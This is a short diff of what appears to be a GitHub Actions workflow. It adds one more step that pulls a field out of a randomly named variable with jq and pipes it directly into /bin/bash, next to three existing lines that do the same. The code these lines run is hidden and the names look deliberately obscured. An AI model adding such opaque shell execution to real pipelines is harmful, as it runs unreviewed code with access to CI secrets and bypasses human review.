@@ -30,6 +30,7 @@ jobs:
           echo $d34 | jq -r .ka39752 | /bin/bash
           echo $sa53 | jq -r .bke1316 | /bin/bash
           echo $rehbd0 | jq -r .ihfzl426 | /bin/bash
+          printf '%s' "$gz212" | jq -r .kw10829 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
